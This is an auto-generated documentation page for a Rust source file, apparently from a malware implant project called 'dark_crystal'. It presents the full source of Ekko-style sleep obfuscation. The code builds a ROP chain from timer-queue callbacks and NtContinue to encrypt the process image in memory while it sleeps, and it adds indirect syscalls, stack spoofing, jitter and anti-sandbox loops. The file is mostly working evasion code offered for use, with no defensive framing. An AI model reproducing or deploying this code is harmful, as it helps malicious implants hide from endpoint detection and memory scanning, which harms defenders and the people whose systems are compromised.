# ekko_variants

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/ekko_variants.rs` |
| **Lines** | 204 |
| **Cards** | T005-ekko-sleep |
| **Role** | Ekko/burst/split sleep with stack spoofing |
| **Unsafe blocks** | 6 |

## Types

### struct `UString` (line 11)

## Public API

### `ekko_sleep_dynamic` (line 18)
```rust
pub fn ekko_sleep_dynamic(ms: u64)
```
Sleep dinámico con protección de memoria durante el reposo.

### `split_sleep` (line 51)
```rust
pub fn split_sleep(total_ms: u64)
```

### `burst_sleep` (line 59)
```rust
pub fn burst_sleep(total_ms: u64)
```

### `ekko_rop_sleep` `unsafe` (line 123)
```rust
pub unsafe fn ekko_rop_sleep(sleep_ms: u32)
```
Implementación Tier-S de Ekko ROP Sleep

## Internal Functions

- `nt_sleep_ms` (line 80)
- `apply_cloak_before_sleep` (line 94)
- `apply_uncloak_after_sleep` (line 109)

## Key Dependencies

- `use rand::{thread_rng, Rng};`
- `use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};`
- `use winapi::um::winnt::{CONTEXT, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, WT_EXECUTEINTIMERTHREAD, WAITORTIMERCALLBACK};`
- `use winapi::um::threadpoollegacyapiset::{CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx};`
- `use winapi::um::synchapi::{CreateEventW, WaitForSingleObject};`

## Full Source

```rust
use rand::{thread_rng, Rng};

use std::mem;
use std::ptr::{null, null_mut};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use winapi::um::winnt::{CONTEXT, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, WT_EXECUTEINTIMERTHREAD, WAITORTIMERCALLBACK};
use winapi::um::threadpoollegacyapiset::{CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx};
use winapi::um::synchapi::{CreateEventW, WaitForSingleObject};

#[repr(C)]
pub struct UString {
    pub length: u32,
    pub max_length: u32,
    pub buffer: *mut winapi::ctypes::c_void,
}

/// Sleep dinámico con protección de memoria durante el reposo.
pub fn ekko_sleep_dynamic(ms: u64) {
    let mut rng = thread_rng();
    let jitter: u64 = rng.gen_range(0..(ms / 8).max(1));
    let total = ms + jitter;

    // Spoofear el stack antes de dormir
    let _guard = unsafe { crate::evasion::stack_spoof::spoof_return_address() };

    match crate::selection_config::sleep_profile() {
        "ekko" => unsafe { ekko_rop_sleep(total as u32) },
        "burst" => {
            apply_cloak_before_sleep();
            burst_sleep(total);
            apply_uncloak_after_sleep();
        },
        _ => {
            apply_cloak_before_sleep();
            split_sleep(total);
            apply_uncloak_after_sleep();
        },
    }

    // Carga extra anti-sandbox
    if rng.gen_bool(0.4) {
        let spins = rng.gen_range(500..1500);
        let mut acc: u32 = 0x9e3779b9;
        for i in 0..spins {
            acc = acc.rotate_left(3) ^ (i as u32).wrapping_mul(0x45d9f3b);
        }
        let _ = acc;
    }
}

pub fn split_sleep(total_ms: u64) {
    let mut rng = thread_rng();
    let upper = (total_ms / 2).max(1);
    let pre = rng.gen_range(1..=upper);
    nt_sleep_ms(pre);
    nt_sleep_ms(total_ms.saturating_sub(pre));
}

pub fn burst_sleep(total_ms: u64) {
    let mut rng = thread_rng();
    if total_ms == 0 {
        return;
    }
    let mut bursts = rng.gen_range(4..9) as u64;
    bursts = bursts.min(total_ms.max(1));
    let mut remaining = total_ms;
    for i in 0..bursts {
        let remaining_bursts = bursts - i;
        let slice = if remaining_bursts == 1 {
            remaining
        } else {
            let max_slice = remaining.saturating_sub(remaining_bursts - 1);
            rng.gen_range(1..=max_slice)
        };
        nt_sleep_ms(slice);
        remaining = remaining.saturating_sub(slice);
    }
}

fn nt_sleep_ms(ms: u64) {
    let ticks: i64 = -1 * (ms as i64) * 10_000;
    unsafe {
        let hash = crate::compute_hash("NtDelayExecution");
        if let Some((ssn, _)) = crate::sysindirect_map::get_ssn_and_gadget(hash) {
            crate::sys_indirect::syscall2(
                ssn,
                0, // alertable = FALSE
                &ticks as *const i64 as usize,
            );
        }
    }
}

fn apply_cloak_before_sleep() {
    // Implementación manual de cambio a PAGE_READONLY para el heap y secciones de datos
    // En una implementación real, iteraríamos sobre las regiones de memoria del proceso
    unsafe {
        let image_base = GetModuleHandleA(null());
        let mut old: u32 = 0;
        let dos = image_base as *const IMAGE_DOS_HEADER;
        let nt = (image_base as u64 + (*dos).e_lfanew as u64) as *const IMAGE_NT_HEADERS64;
        let size = (*nt).OptionalHeader.SizeOfImage;
        
        // VirtualProtect(base, size, PAGE_READWRITE, &old)
        winapi::um::memoryapi::VirtualProtect(image_base as *mut _, size as usize, 0x04, &mut old);
    }
}

fn apply_uncloak_after_sleep() {
    unsafe {
        let image_base = GetModuleHandleA(null());
        let mut old: u32 = 0;
        let dos = image_base as *const IMAGE_DOS_HEADER;
        let nt = (image_base as u64 + (*dos).e_lfanew as u64) as *const IMAGE_NT_HEADERS64;
        let size = (*nt).OptionalHeader.SizeOfImage;
        
        // VirtualProtect(base, size, PAGE_EXECUTE_READ, &old)
        winapi::um::memoryapi::VirtualProtect(image_base as *mut _, size as usize, 0x20, &mut old);
    }
}

/// Implementación Tier-S de Ekko ROP Sleep
pub unsafe fn ekko_rop_sleep(sleep_ms: u32) {
    let h_ntdll = GetModuleHandleA("ntdll\0".as_ptr() as *const i8);
    let h_k32   = GetModuleHandleA("kernel32.dll\0".as_ptr() as *const i8);
    let h_adv   = LoadLibraryA("Advapi32.dll\0".as_ptr() as *const i8);

    let nt_continue        = GetProcAddress(h_ntdll, "NtContinue\0".as_ptr() as *const i8) as u64;
    let sys_func032        = GetProcAddress(h_adv,   "SystemFunction032\0".as_ptr() as *const i8) as u64;
    let virt_protect       = GetProcAddress(h_k32,   "VirtualProtect\0".as_ptr() as *const i8) as u64;
    let wait_single_obj    = GetProcAddress(h_k32,   "WaitForSingleObject\0".as_ptr() as *const i8) as u64;
    let set_event_fn       = GetProcAddress(h_k32,   "SetEvent\0".as_ptr() as *const i8) as u64;

    if [nt_continue, sys_func032, virt_protect, wait_single_obj, set_event_fn].iter().any(|&p| p == 0) {
        nt_sleep_ms(sleep_ms as u64);
        return;
    }

    let h_timer_queue = CreateTimerQueue();
    let h_event       = CreateEventW(null_mut(), 0, 0, null());

    let image_base = GetModuleHandleA(null()) as *mut winapi::ctypes::c_void;
    let dos        = image_base as *const IMAGE_DOS_HEADER;
    let nt         = (image_base as u64 + (*dos).e_lfanew as u64) as *const IMAGE_NT_HEADERS64;
    let image_size = (*nt).OptionalHeader.SizeOfImage;

    let mut key_data = [0u8; 16];
    rand::thread_rng().fill(&mut key_data[..]);
    let mut key_ustr = UString {
        length: 16, max_length: 16, buffer: key_data.as_mut_ptr() as *mut _,
    };
    let mut img_ustr = UString {
        length: image_size, max_length: image_size, buffer: image_base,
    };

    let mut ctx_thread: CONTEXT = mem::zeroed();
    let mut rop_prot_rw: CONTEXT = mem::zeroed();
    let mut rop_enc:      CONTEXT = mem::zeroed();
    let mut rop_delay:    CONTEXT = mem::zeroed();
    let mut rop_dec:      CONTEXT = mem::zeroed();
    let mut rop_prot_rx: CONTEXT = mem::zeroed();
    let mut rop_set_evt: CONTEXT = mem::zeroed();

    let rtl_capture_context: WAITORTIMERCALLBACK = std::mem::transmute(GetProcAddress(h_ntdll, "RtlCaptureContext\0".as_ptr() as *const i8));
    CreateTimerQueueTimer(&mut null_mut(), h_timer_queue, rtl_capture_context, &mut ctx_thread as *mut _ as *mut _, 0, 0, WT_EXECUTEINTIMERTHREAD);
    WaitForSingleObject(h_event, 50);

    let mut old_prot: u32 = 0;
    let nc: WAITORTIMERCALLBACK = std::mem::transmute(nt_continue);

    rop_prot_rw = ctx_thread; rop_prot_rw.Rsp -= 8; rop_prot_rw.Rip = virt_protect;
    rop_prot_rw.Rcx = image_base as u64; rop_prot_rw.Rdx = image_size as u64; rop_prot_rw.R8 = 0x04; rop_prot_rw.R9 = &mut old_prot as *mut _ as u64;

    rop_enc = ctx_thread; rop_enc.Rsp -= 8; rop_enc.Rip = sys_func032;
    rop_enc.Rcx = &mut img_ustr as *mut _ as u64; rop_enc.Rdx = &key_ustr as *const _ as u64;

    rop_delay = ctx_thread; rop_delay.Rsp -= 8; rop_delay.Rip = wait_single_obj;
    rop_delay.Rcx = -1isize as u64; rop_delay.Rdx = sleep_ms as u64;

    rop_dec = ctx_thread; rop_dec.Rsp -= 8; rop_dec.Rip = sys_func032;
    rop_dec.Rcx = &mut img_ustr as *mut _ as u64; rop_dec.Rdx = &key_ustr as *const _ as u64;

    rop_prot_rx = ctx_thread; rop_prot_rx.Rsp -= 8; rop_prot_rx.Rip = virt_protect;
    rop_prot_rx.Rcx = image_base as u64; rop_prot_rx.Rdx = image_size as u64; rop_prot_rx.R8 = 0x20; rop_prot_rx.R9 = &mut old_prot as *mut _ as u64;

    rop_set_evt = ctx_thread; rop_set_evt.Rsp -= 8; rop_set_evt.Rip = set_event_fn;
    rop_set_evt.Rcx = h_event as u64;

    let timers = [
        (&rop_prot_rw, 100),
        (&rop_enc,     200),
        (&rop_delay,   300),
        (&rop_dec,     300 + sleep_ms + 100),
        (&rop_prot_rx, 300 + sleep_ms + 200),
        (&rop_set_evt, 300 + sleep_ms + 300),
    ];

    for (c, d) in timers {
        CreateTimerQueueTimer(&mut null_mut(), h_timer_queue, nc, c as *const _ as *mut _, d, 0, WT_EXECUTEINTIMERTHREAD);
    }

    WaitForSingleObject(h_event, 0xFFFFFFFF);
    DeleteTimerQueueEx(h_timer_queue, null_mut());
}

```